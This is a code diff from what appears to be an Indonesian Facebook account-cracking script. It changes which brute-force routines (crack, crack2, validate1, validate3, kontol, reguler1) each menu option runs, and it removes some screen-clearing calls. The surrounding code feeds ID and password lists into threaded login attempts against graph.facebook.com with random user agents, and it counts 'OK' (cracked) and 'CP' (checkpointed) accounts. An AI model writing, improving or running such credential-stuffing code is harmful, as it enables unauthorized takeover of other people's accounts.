@@ -890,13 +890,13 @@ def setting():
 	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [green] B-Api [white]')
 	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if hc in ['1','01']:
-		method.append('metod1')
+		method.append('metod2')
 	elif hc in ['2','02']:
-		method.append('metod4')
-	elif hc in ['3','03']:
 		method.append('metod3')
-	else:
+	elif hc in ['3','03']:
 		method.append('metod1')
+	else:
+		method.append('metod3')
 	prints(nel(f'                        [bold blue]Manual Password?', style=f"bold purple")) 
 	pwplus=input(f'✶ ━━⫸ {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
 	if pwplus in ['y','Y']:
@@ -966,15 +966,15 @@ def passwrd():
 					pwv.append(xpwd)
 			else:pass
 			if 'metod1' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'metod2' in method:
 				pool.submit(validate1,idf,pwv)
+			elif 'metod2' in method:
+				pool.submit(validate3,idf,pwv)
 			elif 'metod3' in method:
 				pool.submit(kontol,idf,pwv)
 			elif 'metod4' in method:
-				pool.submit(crack2,idf,pwv)
+				pool.submit(reguler1,idf,pwv)
 			else:
-				pool.submit(crack,idf,pwv)
+				pool.submit(kontol,idf,pwv)
 				
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
@@ -1544,9 +1544,8 @@ def kontol(idf,pwv):
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}");loading();clear()
+	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
 	sys.stdout.flush()
-	clear()
 	ua = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
@@ -1599,9 +1598,8 @@ def crack2(idf,pwv):
 	pers = loop*100/len(id2)
 	fff = '%'
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}");loading();clear()
+	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
 	sys.stdout.flush()
-	clear()
 	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
 	ua = random.choice(ugen)
 	get = geturlm()
